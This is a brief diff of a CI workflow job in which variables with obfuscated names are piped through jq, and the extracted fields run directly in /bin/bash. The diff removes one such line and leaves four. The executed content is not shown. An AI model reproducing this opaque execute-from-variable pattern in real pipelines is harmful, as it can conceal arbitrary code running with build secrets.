@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$x434" | jq -r .m456 | /bin/bash
           echo $zge3 | jq -r .jrlf7213 | /bin/bash
           echo $onas81 | jq -r .whe6 | /bin/bash
-          printf '%s' "$nw62" | jq -r .iuktc18312 | /bin/bash
           printf '%s' "$im954" | jq -r .qzlle21822 | /bin/bash
 
       - name: Upload artifact
